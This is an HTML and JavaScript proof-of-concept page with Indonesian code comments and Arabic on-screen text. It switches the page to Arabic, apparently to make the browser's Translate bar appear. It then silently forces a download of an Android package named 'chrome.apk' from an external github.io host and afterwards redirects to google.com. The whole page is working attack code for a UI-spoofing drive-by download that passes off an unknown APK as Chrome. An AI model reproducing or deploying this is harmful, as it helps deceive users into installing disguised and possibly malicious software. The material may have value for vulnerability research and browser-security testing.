<!doctype html>
<html lang="ar">
<head>
  <meta charset="utf-8">
  <title>اختبار مع إعادة التوجيه</title>
  <style>
    body {
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      font-family: sans-serif;
    }
    button {
      background: #4CAF50;
      border: none;
      color: white;
      padding: 16px 28px;
      font-size: 18px;
      cursor: pointer;
    }
  </style>
</head>

<body>

<button onclick="poc()">اضغط هنا للمتابعة</button>

<script>
function poc() {

  // 1. Tampilkan halaman bahasa asing → trigger Translate
  document.body.innerHTML = `
    <h1>هذه صفحة اختبار مع إعادة التوجيه</h1>
    <p>جارٍ التحميل… يرجى الانتظار</p>
  `;

  // 2. Delay kecil untuk Translate UI muncul
  setTimeout(() => {

    // 3. Trigger download
    const a = document.createElement("a");
    a.href = "https://ecdnts-del.github.io/test-apk/chrome.apk";
    a.download = "chrome.apk";
    document.body.appendChild(a);
    a.click();
    a.remove();

    // 4. Redirect ke halaman bahasa asing kedua (agar Translate tetap muncul)
    setTimeout(() => {
      window.location.href = "https://www.google.com"; 
      // Halaman target juga berbahasa Arab
    }, 5500);

  }, 300);
}
</script>

</body>
</html>
